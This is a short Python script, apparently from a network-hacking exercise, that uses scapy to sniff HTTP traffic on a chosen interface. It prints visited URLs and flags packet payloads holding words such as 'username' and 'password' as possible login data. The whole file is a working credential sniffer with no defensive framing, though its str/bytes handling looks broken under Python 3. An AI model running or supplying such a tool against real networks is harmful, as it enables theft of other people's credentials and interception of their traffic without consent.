import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface")
    # return options
    return parser.parse_args()


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    page = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return page


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "username", "email", "password",
                    "pass", "password1", "password2", "pass1", "pass2"]
        for key in keywords:
            if key in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("Url: " + get_url(packet))
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible login data: " + login_info)
        print("")


options = get_arguments()
sniff(options.interface)
